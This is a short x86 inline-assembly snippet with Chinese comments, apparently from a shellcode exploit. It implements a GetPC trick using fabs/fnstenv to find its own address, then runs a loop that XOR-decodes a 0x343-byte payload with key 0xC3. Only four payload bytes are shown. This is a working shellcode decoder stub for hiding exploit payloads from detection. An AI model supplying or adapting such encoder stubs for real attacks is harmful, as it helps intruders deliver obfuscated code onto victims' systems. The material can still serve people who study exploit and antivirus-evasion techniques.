__asm {

		_start:
		fabs; fabs指令
		fnstenv[esp]; 保存环境，该结构偏移12字节处就是最后执行的浮点指令的运行时地址
		pop edx
		pop edx
		pop edx
		pop edx; 此处将fabs指令的运行时地址传给edx
		add edx, 26; offset from fabs ->xor buffer    edx = edx + 26, 26的大小指的是从shllcode到fabs的偏移
			
		SHORT_XOR_BEG:
		XOR ECX, ECX
		ADD ECX, 0x343; payload size

		short_xor_xor:
		xor [edx], 0xc3; 
		inc edx;
		loop short_xor_xor

		shellcode :
		_EMIT 0x3F
		_EMIT 0x2B
		_EMIT 0x4A
		_EMIT 0xC3
}
